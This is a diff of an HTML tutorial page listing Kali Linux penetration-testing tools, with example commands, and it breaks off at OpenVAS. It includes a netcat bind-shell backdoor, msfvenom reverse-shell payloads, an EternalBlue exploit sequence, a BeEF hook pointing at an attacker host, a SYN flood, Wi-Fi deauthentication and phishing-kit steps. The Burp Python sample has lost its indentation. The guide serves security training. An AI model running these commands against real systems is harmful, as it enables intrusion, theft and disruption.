@@ -78,6 +78,7 @@
         .section-title { position: relative; margin-bottom: 2rem; padding-bottom: 0.5rem; color: var(--body-loud-color); font-weight: 700; font-size: 1.8rem; margin-top: 3rem; }
         .section-title::after { content: ''; position: absolute; bottom: 0; left: 0; width: 60px; height: 4px; background-color: var(--primary); border-radius: 2px; }
         .text-block { color: var(--body-quiet-color); font-size: 1rem; line-height: 1.6; margin-bottom: 1.5rem; }
+        .text-block strong { color: var(--body-fg); }
         
         .tool-title { font-size: 1.3rem; color: var(--body-loud-color); margin-top: 2rem; margin-bottom: 0.5rem; font-weight: 600; display: flex; align-items: center; gap: 10px; }
         .tool-title i { color: var(--primary); }
@@ -85,10 +86,12 @@
         ul, ol { color: var(--body-quiet-color); font-size: 0.95rem; line-height: 1.6; margin-bottom: 1.5rem; padding-left: 25px; }
         li { margin-bottom: 8px; }
 
-        /* Code Blocks */
-        pre { background: var(--input-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--hairline-color); overflow-x: auto; margin: 1.5rem 0; font-family: 'Courier New', Courier, monospace; font-size: 0.85rem; line-height: 1.5; color: var(--primary); }
-        pre code { color: var(--body-fg); }
-        .inline-code { background: var(--input-bg); padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', Courier, monospace; font-size: 0.85rem; color: var(--primary); }
+        /* Code Blocks & ASCII Art */
+        pre { background: var(--input-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--hairline-color); overflow-x: auto; margin: 1.5rem 0; font-family: 'Courier New', Courier, monospace; font-size: 0.85rem; line-height: 1.5; color: var(--body-fg); white-space: pre-wrap; word-wrap: break-word; }
+        pre code { color: var(--primary); }
+        .ascii-art { color: var(--body-quiet-color); background: var(--darkened-bg); text-align: left; }
+        .watermark { color: var(--body-quiet-color); font-size: 0.85rem; text-align: center; margin: 2rem 0; font-style: italic; opacity: 0.7; }
+        .toc-list { color: var(--body-quiet-color); font-size: 0.9rem; line-height: 1.8; padding-left: 20px; }
 
         /* Custom Alert Box */
         .alert-info-custom { background-color: var(--selected-bg); border-left: 4px solid var(--primary); padding: 1.5rem; border-radius: 8px; margin: 2rem 0; color: var(--body-fg); }
@@ -169,7 +172,7 @@
                 <li><a href="labs.html">1. Networking Labs Overview</a></li>
                 <li><a href="nessus.html">2. Nessus Vulnerability Assessment</a></li>
                 <li><a href="damietta-port.html">3. Damietta Port Authority</a></li>
-                <li><a href="kali-tools.html">4. Top 50 Kali Linux Tools</a></li>
+                <li><a href="kali-tools.html" class="active">4. Top 50 Kali Linux Tools</a></li>
                 <li><a href="lesson-5.html">5. Lesson Five Title</a></li>
             </ul>
         </nav>
@@ -178,34 +181,194 @@
     <!-- RIGHT CONTENT AREA -->
     <div class="content-area">
         <div class="page-header">
-            <h1>Top 50 Kali Linux Tools</h1>
+            <h1>Top 50 Kali Linux Tools: Comprehensive Guide for Security Professionals</h1>
             <p>Comprehensive Guide for Security Professionals. Understanding proper implementation is crucial for conducting thorough security evaluations while maintaining ethical and legal compliance.</p>
         </div>
 
-        <!-- Section 1: Introduction -->
+<!-- Table of Contents -->
+<section id="toc">
+    <h2 class="section-title">Document Outline</h2>
+    <ul class="toc-main">
+        <li>Introduction</li>
+        <li>Understanding the Kali Linux Security Ecosystem
+            <ul class="toc-sub">
+                <li>Kali Tool Categories and Architecture</li>
+            </ul>
+        </li>
+        <li>Network Analysis and Scanning Tools
+            <ul class="toc-sub">
+                <li>1. Nmap (Network Mapper)</li>
+                <li>2. Masscan</li>
+                <li>3. Netcat (nc)</li>
+                <li>4. Wireshark</li>
+                <li>5. Hping3</li>
+            </ul>
+        </li>
+        <li>Web Application Testing Tools
+            <ul class="toc-sub">
+                <li>6. Burp Suite</li>
+                <li>7. OWASP ZAP (Zed Attack Proxy)</li>
+                <li>8. SQLMap</li>
+                <li>9. Nikto</li>
+                <li>10. Dirb/Dirbuster</li>
+            </ul>
+        </li>
+        <li>Wireless Security Testing Tools
+            <ul class="toc-sub">
+                <li>11. Aircrack-ng Suite</li>
+                <li>12. Reaver/Bully</li>
+                <li>13. Wifite</li>
+            </ul>
+        </li>
+        <li>Exploitation Framework Tools
+            <ul class="toc-sub">
+                <li>14. Metasploit Framework</li>
+                <li>15. BeEF (Browser Exploitation Framework)</li>
+                <li>16. Social Engineering Toolkit (SET)</li>
+            </ul>
+        </li>
+        <li>Password Cracking and Analysis Tools
+            <ul class="toc-sub">
+                <li>17. John the Ripper</li>
+                <li>18. Hashcat</li>
+                <li>19. Hydra</li>
+                <li>20. Medusa</li>
+            </ul>
+        </li>
+        <li>Vulnerability Analysis Tools
+            <ul class="toc-sub">
+                <li>21. OpenVAS</li>
+                <li>22. Lynis</li>
+                <li>23. Wapiti</li>
+            </ul>
+        </li>
+        <li>Forensics and Information Gathering Tools
+            <ul class="toc-sub">
+                <li>24. Maltego</li>
+                <li>25. Recon-ng</li>
+                <li>26. theHarvester</li>
+                <li>27. Dmitry</li>
+                <li>28. Forensics Toolkit (Autopsy/Sleuth Kit)</li>
+            </ul>
+        </li>
+        <li>Reverse Engineering Tools
+            <ul class="toc-sub">
+                <li>29. Ghidra</li>
+                <li>30. Radare2</li>
+                <li>31. GDB (with PEDA/GEF/pwndbg)</li>
+            </ul>
+        </li>
+        <li>Exploitation Development Tools
+            <ul class="toc-sub">
+                <li>32. MSFVenom</li>
+                <li>33. Searchsploit</li>
+                <li>34. Pattern Create/Offset</li>
+            </ul>
+        </li>
+        <li>Network Spoofing and MITM Tools
+            <ul class="toc-sub">
+                <li>35. Ettercap</li>
+                <li>36. Bettercap</li>
+                <li>37. Responder</li>
+            </ul>
+        </li>
+        <li>Mobile Security Testing Tools
+            <ul class="toc-sub">
+                <li>38. Android Debug Bridge (ADB)</li>
+                <li>39. MobSF (Mobile Security Framework)</li>
+                <li>40. Frida</li>
+            </ul>
+        </li>
+        <li>Cryptography and Steganography Tools
+            <ul class="toc-sub">
+                <li>41. Hashidentifier</li>
+                <li>42. Steghide</li>
+                <li>43. Binwalk</li>
+            </ul>
+        </li>
+        <li>Post-Exploitation Tools
+            <ul class="toc-sub">
+                <li>44. Mimikatz</li>
+                <li>45. PowerSploit</li>
+                <li>46. Evil-WinRM</li>
+            </ul>
+        </li>
+        <li>Reporting and Documentation Tools
+            <ul class="toc-sub">
+                <li>47. Dradis</li>
+                <li>48. Faraday</li>
+                <li>49. CherryTree</li>
+                <li>50. Pipal</li>
+            </ul>
+        </li>
+        <li>Advanced Tool Integration and Automation
+            <ul class="toc-sub">
+                <li>Combining Tools for Comprehensive Assessments</li>
+                <li>Custom Tool Development</li>
+            </ul>
+        </li>
+        <li>Best Practices for Kali Linux Tool Usage
+            <ul class="toc-sub">
+                <li>Legal and Ethical Considerations</li>
+                <li>Tool Selection Strategy</li>
+            </ul>
+        </li>
+        <li>Conclusion</li>
+        <li>Frequently Asked Questions
+            <ul class="toc-sub">
+                <li>Which Kali Linux tools should beginners focus on first?</li>
+                <li>How can I practice using Kali Linux tools legally and safely?</li>
+                <li>What are the essential differences between Kali Linux tools for different testing phases?</li>
+                <li>How do I choose between similar tools in Kali Linux?</li>
+                <li>What are the most common mistakes when using Kali Linux tools?</li>
+            </ul>
+        </li>
+        <li>Related Articles and Resources</li>
+    </ul>
+</section>
+
+        <!-- Introduction -->
         <section id="introduction">
-            <h2 class="section-title">Understanding the Kali Linux Security Ecosystem</h2>
-            <p class="text-block">Kali Linux has established itself as the premier penetration testing and security auditing platform, bundling over 600 security tools in a single distribution. Originally developed from BackTrack Linux, Kali provides security professionals, ethical hackers, and penetration testers with a comprehensive toolkit for assessing and improving security postures.</p>
-            
-            <div class="alert-info-custom">
-                <h4><i class="fas fa-sitemap"></i> Kali Tool Categories</h4>
-                <p>The Kali Linux toolkit is organized into distinct categories to help professionals select appropriate tools for specific assessment phases:</p>
-                <ul>
-                    <li>Information Gathering & Vulnerability Analysis</li>
-                    <li>Web Applications & Wireless Attacks</li>
-                    <li>Exploitation Tools & Forensics</li>
-                    <li>Password Attacks & Reverse Engineering</li>
-                    <li>Social Engineering & Post-Exploitation</li>
-                </ul>
-            </div>
+            <h2 class="section-title">Introduction</h2>
+            <p class="text-block">Kali Linux has established itself as the premier penetration testing and security auditing platform, bundling over 600 security tools in a single distribution. Originally developed from BackTrack Linux, Kali provides security professionals, ethical hackers, and penetration testers with a comprehensive toolkit for assessing and improving security postures. This technical deep-dive explores the 50 most essential Kali Linux tools, examining their capabilities, practical applications, and advanced usage patterns that distinguish professional security assessments from amateur attempts. Understanding these tools' proper implementation is crucial for conducting thorough security evaluations while maintaining ethical and legal compliance.</p>
         </section>
 
-        <!-- Section 2: Network Analysis -->
+        <!-- Ecosystem -->
+        <section id="ecosystem">
+            <h2 class="section-title">Understanding the Kali Linux Security Ecosystem</h2>
+            <h3 class="tool-title">Kali Tool Categories and Architecture</h3>
+            <p class="text-block">The Kali Linux toolkit is organized into distinct categories, each serving specific security assessment needs:</p>
+            <pre class="ascii-art">┌─────────────────────────────────────────────────────────────┐
+│ Kali Linux Tool Categories │
+└─────────────────────────────────────────────────────────────┘
+│
+┌─────────────────────┼─────────────────────┐
+▼ ▼ ▼
+┌────────────────┐ ┌────────────────┐ ┌────────────────┐
+│ Information │ │ Vulnerability │ │ Web │
+│ Gathering │ │ Analysis │ │ Applications │
+└────────────────┘ └────────────────┘ └────────────────┘
+│ │ │
+▼ ▼ ▼
+┌────────────────┐ ┌────────────────┐ ┌────────────────┐
+│ Wireless │ │ Exploitation │ │ Forensics │
+│ Attacks │ │ Tools │ │ Tools │
+└────────────────┘ └────────────────┘ └────────────────┘
+│ │ │
+▼ ▼ ▼
+┌────────────────┐ ┌────────────────┐ ┌────────────────┐
+│ Password │ │ Reverse │ │ Social │
+│ Attacks │ │ Engineering │ │ Engineering │
+└────────────────┘ └────────────────┘ └────────────────┘</pre>
+            <p class="text-block">This categorization helps security professionals select appropriate tools for specific assessment phases, from initial reconnaissance through exploitation and post-exploitation activities.</p>
+        </section>
+
+        <!-- Network Analysis -->
         <section id="network-analysis">
             <h2 class="section-title">Network Analysis and Scanning Tools</h2>
             
             <div class="tool-title"><i class="fas fa-network-wired"></i> 1. Nmap (Network Mapper)</div>
-            <p class="text-block">Nmap remains the gold standard for network discovery and security auditing, offering unparalleled flexibility in network reconnaissance.</p>
+            <p class="text-block">Nmap remains the gold standard for network discovery and security auditing, offering unparalleled flexibility in network reconnaissance:</p>
             <pre><code># Comprehensive network scan with service detection
 nmap -sV -sC -O -A -T4 192.168.1.0/24
 
@@ -216,91 +379,228 @@ nmap -sS -T2 -p- --max-retries 1 --min-rate 100 target.com
 nmap --script vuln --script-args=unsafe=1 192.168.1.100
 
 # Advanced firewall evasion techniques
-nmap -sS -f --mtu 24 --data-length 1337 -D RND:10 --spoof-mac 0 192.168.1.1</code></pre>
+nmap -sS -f --mtu 24 --data-length 1337 -D RND:10 --spoof-mac 0 192.168.1.1
+
+# Custom NSE script execution
+nmap --script=http-vuln-* --script-args http-vuln-cve2017-5638.path=/struts2-showcase/ 192.168.1.100
+
+# UDP service discovery
+nmap -sU -sV --version-intensity 0 -n -T4 192.168.1.0/24
+
+# IPv6 scanning
+nmap -6 -sS -p 80,443,22,21,25 2001:db8::/32</code></pre>
 
             <div class="tool-title"><i class="fas fa-bolt"></i> 2. Masscan</div>
-            <p class="text-block">Masscan provides Internet-scale port scanning capabilities with extraordinary speed.</p>
+            <p class="text-block">Masscan provides Internet-scale port scanning capabilities with extraordinary speed:</p>
             <pre><code># High-speed port scanning
 masscan -p1-65535 192.168.1.0/24 --rate=1000
 
 # Banner grabbing with output formatting
-masscan -p80,443,445,22 10.0.0.0/8 --banners --source-port 61000 -oJ scan_results.json</code></pre>
+masscan -p80,443,445,22 10.0.0.0/8 --banners --source-port 61000 -oJ scan_results.json
+
+# Exclude ranges and rate limiting
+masscan 0.0.0.0/0 -p80,443 --excludefile exclude.txt --rate=100000
+
+# Custom packet crafting
+masscan --ports 0-65535 --adapter-ip 192.168.1.100 --router-mac 00:11:22:33:44:55 192.168.1.0/24</code></pre>
 
             <div class="tool-title"><i class="fas fa-terminal"></i> 3. Netcat (nc)</div>
-            <p class="text-block">The "Swiss Army knife" of networking tools, essential for various security tasks.</p>
+            <p class="text-block">The "Swiss Army knife" of networking tools, essential for various security tasks:</p>
             <pre><code># Reverse shell listener
 nc -nlvp 4444
 
-# Port scanning
-nc -zvn 192.168.1.100 1-1000 2>&amp;1 | grep succeeded
+# Connect to remote port
+nc -nv 192.168.1.100 80
 
-# File transfer (Receiver)
-nc -l -p 1234 > received_file.txt</code></pre>
+# Port scanning
+nc -zvn 192.168.1.100 1-1000 2>&1 | grep succeeded
+
+# File transfer
+# Receiver:
+nc -l -p 1234 > received_file.txt
+# Sender:
+nc -w 3 192.168.1.100 1234 < file_to_send.txt
+
+# Create backdoor (educational purpose only)
+nc -l -p 4444 -e /bin/bash
+
+# UDP connections
+nc -u -l -p 1234
+
+# HTTP request crafting
+echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80</code></pre>
 
             <div class="tool-title"><i class="fas fa-wifi"></i> 4. Wireshark</div>
-            <p class="text-block">The premier packet analysis tool for deep network inspection.</p>
-            <pre><code># Command-line capture with tshark
+            <p class="text-block">The premier packet analysis tool for deep network inspection:</p>
+            <pre><code># Capture filters for specific traffic
+wireshark -i eth0 -f "tcp port 80 and host 192.168.1.100"
+
+# Display filters for analysis
+# HTTP traffic: http
+# HTTPS handshakes: ssl.handshake.type == 1
+# DNS queries: dns.flags.response == 0
+# SYN packets: tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+# Command-line capture with tshark
 tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri
 
 # Extract files from packet capture
 tshark -r capture.pcap --export-objects "http,extracted_files"</code></pre>
+            <pre><code># Real-time statistics
+tshark -i eth0 -q -z io,stat,1
+
+# Decrypt HTTPS traffic with key
+wireshark -o "ssl.keys_list:192.168.1.100,443,http,server.key" -r capture.pcap</code></pre>
 
             <div class="tool-title"><i class="fas fa-server"></i> 5. Hping3</div>
-            <p class="text-block">Advanced packet crafting tool for security testing.</p>
+            <p class="text-block">Advanced packet crafting tool for security testing:</p>
             <pre><code># SYN flood testing
 hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com
 
 # Traceroute using different protocols
-hping3 --traceroute -V -S -p 80 target.com</code></pre>
+hping3 --traceroute -V -S -p 80 target.com
+
+# Port scanning with custom flags
+hping3 -8 50-60 -S -V target.com
+
+# Firewall testing with fragmentation
+hping3 -f -p 80 -S target.com
+
+# Timestamp collection
+hping3 -S -p 80 --tcp-timestamp target.com
+
+# Custom packet with data
+hping3 -p 80 -S -d 50 -E malicious.txt target.com</code></pre>
         </section>
 
-        <!-- Section 3: Web Application Testing -->
+        <!-- Web Application Testing -->
         <section id="web-app-testing">
             <h2 class="section-title">Web Application Testing Tools</h2>
 
             <div class="tool-title"><i class="fas fa-globe"></i> 6. Burp Suite</div>
-            <p class="text-block">The industry-standard web application security testing platform. It acts as a proxy, allowing interception and modification of HTTP requests.</p>
+            <p class="text-block">The industry-standard web application security testing platform:</p>
+            <pre><code># Launch Burp Suite
+burpsuite
+
+# Configure proxy settings
+# Browser: 127.0.0.1:8080
+# Burp: Proxy -> Options -> Running: 127.0.0.1:8080
+
+# Intruder attack configuration example
+# Position: username=§admin§&password=§password§
+# Payloads: Custom wordlist or runtime generation
+# Options: Follow redirects, store responses</code></pre>
+            <pre><code># Scanner configuration for authenticated scanning
+# Session handling rules for cookie/token management
+# Scope definition for targeted scanning
+# Passive/Active scan optimization
+
+# Extension usage (Python example)
+from burp import IBurpExtender, IHttpListener
+
+class BurpExtender(IBurpExtender, IHttpListener):
+def registerExtenderCallbacks(self, callbacks):
+self._callbacks = callbacks
+callbacks.setExtensionName("Custom Security Scanner")
+callbacks.registerHttpListener(self)
+
+def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+if messageIsRequest:
+request = messageInfo.getRequest()
+# Custom security checks</code></pre>
 
             <div class="tool-title"><i class="fas fa-shield-alt"></i> 7. OWASP ZAP (Zed Attack Proxy)</div>
-            <p class="text-block">Open-source web application security scanner.</p>
+            <p class="text-block">Open-source web application security scanner:</p>
             <pre><code># Start ZAP in daemon mode
 zap.sh -daemon -port 8090 -host 0.0.0.0
 
 # Command-line quick scan
-zap-cli --zap-url http://127.0.0.1:8090 -p 8090 quick-scan -s all -r http://target.com</code></pre>
+zap-cli --zap-url http://127.0.0.1:8090 -p 8090 quick-scan -s all -r http://target.com
+
+# Active scan with authentication
+zap-cli active-scan -s all -r http://target.com -c "session=abc123"
+
+# API usage for automation
+curl http://localhost:8090/JSON/ascan/action/scan/?url=http://target.com&recurse=true&inScopeOnly=false
+
+# Generate reports
+zap-cli report -o zap_report.html -f html
+
+# Spider with AJAX support
+zap-cli ajax-spider http://target.com</code></pre>
 
             <div class="tool-title"><i class="fas fa-database"></i> 8. SQLMap</div>
-            <p class="text-block">Automated SQL injection detection and exploitation tool.</p>
+            <p class="text-block">Automated SQL injection detection and exploitation tool:</p>
             <pre><code># Basic SQL injection test
 sqlmap -u "http://target.com/page?id=1" --batch --risk=3 --level=5
 
+# POST request testing
+sqlmap -u "http://target.com/login" --data="username=admin&password=test" --method=POST
+
+# Cookie-based injection
+sqlmap -u "http://target.com/profile" --cookie="session=abc123" --batch
+
 # Database enumeration
 sqlmap -u "http://target.com/page?id=1" --dbs
-sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump</code></pre>
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
+
+# Advanced evasion techniques
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode --random-agent
+
+# OS shell access
+sqlmap -u "http://target.com/page?id=1" --os-shell
+
+# Proxy and TOR usage
+sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --tor --check-tor</code></pre>
 
             <div class="tool-title"><i class="fas fa-search"></i> 9. Nikto</div>
-            <p class="text-block">Web server vulnerability scanner.</p>
+            <p class="text-block">Web server vulnerability scanner:</p>
             <pre><code># Comprehensive scan
 nikto -h http://target.com -o nikto_report.html -Format htm
 
+# Scan with specific plugins
+nikto -h http://target.com -Plugins "apache_expect_xss,subdomain"
+
+# Stealth scanning with delays
+nikto -h http://target.com -Pause 2 -T x 6
+
 # Scan through proxy
-nikto -h http://target.com -useproxy http://localhost:8080</code></pre>
+nikto -h http://target.com -useproxy http://localhost:8080
+
+# Custom user agent and cookies
+nikto -h http://target.com -useragent "Mozilla/5.0" -cookie "session=abc123"
+
+# SSL/TLS testing</code></pre>
+            <pre><code>nikto -h https://target.com -ssl -Tuning 9</code></pre>
 
             <div class="tool-title"><i class="fas fa-folder-tree"></i> 10. Dirb/Dirbuster</div>
-            <p class="text-block">Directory and file brute-forcing tools.</p>
+            <p class="text-block">Directory and file brute-forcing tools:</p>
             <pre><code># Basic directory enumeration
 dirb http://target.com /usr/share/wordlists/dirb/common.txt
 
 # Recursive scanning with extensions
-dirb http://target.com -r -X .php,.txt,.bak</code></pre>
+dirb http://target.com -r -X .php,.txt,.bak
+
+# Custom wordlist with authentication
+dirb http://target.com /custom/wordlist.txt -a "admin:password"
+
+# Non-recursive with specific status codes
+dirb http://target.com -N -z 200,301,302
+
+# Proxy usage with custom headers
+dirb http://target.com -p http://localhost:8080 -H "X-Custom-Header: value"
+
+# Save output and continue scan
+dirb http://target.com -o scan_results.txt -w</code></pre>
         </section>
 
-        <!-- Section 4: Wireless Security -->
+        <!-- Wireless Security -->
         <section id="wireless-security">
             <h2 class="section-title">Wireless Security Testing Tools</h2>
 
             <div class="tool-title"><i class="fas fa-broadcast-tower"></i> 11. Aircrack-ng Suite</div>
-            <p class="text-block">Comprehensive wireless security testing framework.</p>
+            <p class="text-block">Comprehensive wireless security testing framework:</p>
             <pre><code># Enable monitor mode
 airmon-ng start wlan0
 
@@ -308,306 +608,1222 @@ airmon-ng start wlan0
 airodump-ng wlan0mon
 
 # Target specific network
-airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon</code></pre>
+airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+
+# Deauthentication attack
+aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon
+
+# WEP cracking
+aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB -e "NetworkName" wlan0mon</code></pre>
+            <pre><code>aireplay-ng -3 -b 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0mon
+aircrack-ng -b 00:11:22:33:44:55 capture*.cap
+
+# WPA/WPA2 cracking
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture*.cap
+
+# Create fake access point
+airbase-ng -a 00:11:22:33:44:55 --essid "FreeWiFi" -c 6 wlan0mon</code></pre>
 
             <div class="tool-title"><i class="fas fa-key"></i> 12. Reaver/Bully</div>
-            <p class="text-block">WPS PIN brute-force tools.</p>
-            <pre><code># Reaver WPS attack
+            <p class="text-block">WPS PIN brute-force tools:</p>
+            <pre><code># Scan for WPS-enabled networks
+wash -i wlan0mon
+
+# Reaver WPS attack
 reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1
 
 # Bully WPS attack with pixie dust
-bully wlan0mon -b 00:11:22:33:44:55 -d -v 3</code></pre>
+bully wlan0mon -b 00:11:22:33:44:55 -d -v 3
+
+# Advanced Reaver options
+reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -N -S -L -d 1 -r 3:15
+
+# Custom PIN attempts
+reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670</code></pre>
 
             <div class="tool-title"><i class="fas fa-magic"></i> 13. Wifite</div>
-            <p class="text-block">Automated wireless attack tool.</p>
+            <p class="text-block">Automated wireless attack tool:</p>
             <pre><code># Automated attack on all networks
 wifite
 
 # Target specific encryption types
-wifite --wep --wpa</code></pre>
+wifite --wep --wpa
+
+# Custom timeout and requirements
+wifite --wpa --wpat 600 --wpadt 60 --dict /usr/share/wordlists/rockyou.txt
+
+# Specific channel and power threshold
+wifite -c 6 --power 50
+
+# WPS attacks only</code></pre>
+            <pre><code>wifite --wps --wps-ratio 3 --wps-time 600</code></pre>
         </section>
 
-        <!-- Section 5: Exploitation Frameworks -->
+        <!-- Exploitation Frameworks -->
         <section id="exploitation">
             <h2 class="section-title">Exploitation Framework Tools</h2>
 
             <div class="tool-title"><i class="fas fa-bug"></i> 14. Metasploit Framework</div>
-            <p class="text-block">The world's most used penetration testing framework.</p>
+            <p class="text-block">The world's most used penetration testing framework:</p>
             <pre><code># Start Metasploit console
 msfconsole
 
+# Database initialization
+msfdb init
+
+# Search for exploits
+search type:exploit platform:windows smb
+
 # Use exploit module
 use exploit/windows/smb/ms17_010_eternalblue
+show options
 set RHOSTS 192.168.1.100
 set LHOST 192.168.1.50
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-exploit</code></pre>
+exploit
+
+# Post-exploitation
+sessions -l
+sessions -i 1
+sysinfo
+hashdump
+getsystem
+migrate -N explorer.exe
+
+# Auxiliary modules
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+run
+
+# Generate payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > payload.elf
+
+# Encode payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_payload.exe</code></pre>
 
             <div class="tool-title"><i class="fas fa-window-restore"></i> 15. BeEF (Browser Exploitation Framework)</div>
-            <p class="text-block">Browser-focused exploitation framework.</p>
+            <p class="text-block">Browser-focused exploitation framework:</p>
             <pre><code># Start BeEF
 beef-xss
 
 # Hook browsers with JavaScript
-&lt;script src="http://attacker-ip:3000/hook.js"&gt;&lt;/script&gt;</code></pre>
+&lt;script src="http://attacker-ip:3000/hook.js"&gt;&lt;/script&gt;
+
+# REST API usage
+curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login
+
+# Command module execution via API
+curl -H "Content-Type: application/json" -X POST -d '{"hb":"online-browser-id"}' http://127.0.0.1:3000/api/modules/browser/hooked_domain/command
+
+# Integration with Metasploit
+# In BeEF: Configure Metasploit extension
+# In MSF: load msgrpc ServerHost=127.0.0.1 Pass=abc123</code></pre>
 
             <div class="tool-title"><i class="fas fa-user-secret"></i> 16. Social Engineering Toolkit (SET)</div>
-            <p class="text-block">Comprehensive social engineering framework. Launch with <span class="inline-code">setoolkit</span>.</p>
+            <p class="text-block">Comprehensive social engineering framework:</p>
+            <pre><code># Launch SET
+setoolkit
+
+# Create phishing attack
+# 1) Social-Engineering Attacks
+# 2) Website Attack Vectors
+# 3) Credential Harvester Attack Method
+# 2) Site Cloner
+
+# PowerShell attack vector
+# 1) Social-Engineering Attacks
+# 9) PowerShell Attack Vectors
+# 1) PowerShell Alphanumeric Shellcode Injector
+
+# Infectious media generator
+# 1) Social-Engineering Attacks
+# 3) Infectious Media Generator
+# 2) Standard Metasploit Executable
+
+# Mass mailer attack</code></pre>
+            <pre><code># 5) Mass Mailer Attack
+# Configure SMTP settings and target list</code></pre>
         </section>
 
-        <!-- Section 6: Password Cracking -->
+        <!-- Password Cracking -->
         <section id="password-cracking">
             <h2 class="section-title">Password Cracking and Analysis Tools</h2>
 
             <div class="tool-title"><i class="fas fa-user-lock"></i> 17. John the Ripper</div>
-            <p class="text-block">Advanced password cracking tool.</p>
+            <p class="text-block">Advanced password cracking tool:</p>
             <pre><code># Basic password cracking
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
 # Show cracked passwords
-john --show hashes.txt</code></pre>
+john --show hashes.txt
+
+# Incremental mode
+john --incremental:Alpha hashes.txt
+
+# Custom rules
+john --wordlist=wordlist.txt --rules=best64 hashes.txt
+
+# Specific hash format
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5_hashes.txt
+
+# Multi-core processing
+john --fork=4 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Session management
+john --session=mysession hashes.txt
+john --restore=mysession</code></pre>
 
             <div class="tool-title"><i class="fas fa-microchip"></i> 18. Hashcat</div>
-            <p class="text-block">GPU-accelerated password recovery.</p>
-            <pre><code># Dictionary attack
+            <p class="text-block">GPU-accelerated password recovery:</p>
+            <pre><code># Benchmark system
+hashcat -b
+
+# Dictionary attack
 hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
 # Brute force with mask
-hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l</code></pre>
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
+
+# Combination attack</code></pre>
+            <pre><code>hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
+
+# Rule-based attack
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Hybrid attack
+hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
+
+# Show cracked passwords
+hashcat -m 0 hashes.txt --show
+
+# GPU temperature monitoring
+hashcat -m 0 -a 0 hashes.txt wordlist.txt --gpu-temp-abort=90</code></pre>
 
             <div class="tool-title"><i class="fas fa-fast-forward"></i> 19. Hydra</div>
-            <p class="text-block">Network login cracker.</p>
+            <p class="text-block">Network login cracker:</p>
             <pre><code># SSH brute force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
 
 # HTTP POST form
-hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid credentials"</code></pre>
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+# FTP with multiple users
+hydra -L users.txt -P passwords.txt ftp://192.168.1.100
+
+# SMB attack
+hydra -L users.txt -P passwords.txt smb://192.168.1.100
+
+# Custom port and threads
+hydra -s 2222 -t 4 -l root -P passwords.txt ssh://192.168.1.100
+
+# Resume interrupted session
+hydra -R
+
+# Verbose output with found passwords only
+hydra -l admin -P passwords.txt -f -V ssh://192.168.1.100</code></pre>
 
             <div class="tool-title"><i class="fas fa-stream"></i> 20. Medusa</div>
-            <p class="text-block">Parallel network login brute-forcer.</p>
-            <pre><code># Basic usage
-medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh</code></pre>
+            <p class="text-block">Parallel network login brute-forcer:</p>
+            <pre><code># Basic usage</code></pre>
+            <pre><code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
+
+# Multiple hosts
+medusa -H hosts.txt -u admin -P passwords.txt -M ssh
+
+# Custom port and threads
+medusa -h 192.168.1.100 -n 2222 -u root -P passwords.txt -t 10 -M ssh
+
+# Stop on success
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f
+
+# Test specific credentials
+medusa -h 192.168.1.100 -u admin -p password123 -M ssh
+
+# Multiple services scan
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh -M ftp -M telnet</code></pre>
         </section>
 
-        <!-- Section 7: Vulnerability Analysis -->
+        <!-- Vulnerability Analysis -->
         <section id="vuln-analysis">
             <h2 class="section-title">Vulnerability Analysis Tools</h2>
 
             <div class="tool-title"><i class="fas fa-radar"></i> 21. OpenVAS</div>
-            <p class="text-block">Comprehensive vulnerability scanner. Start services with <span class="inline-code">gvm-start</span>.</p>
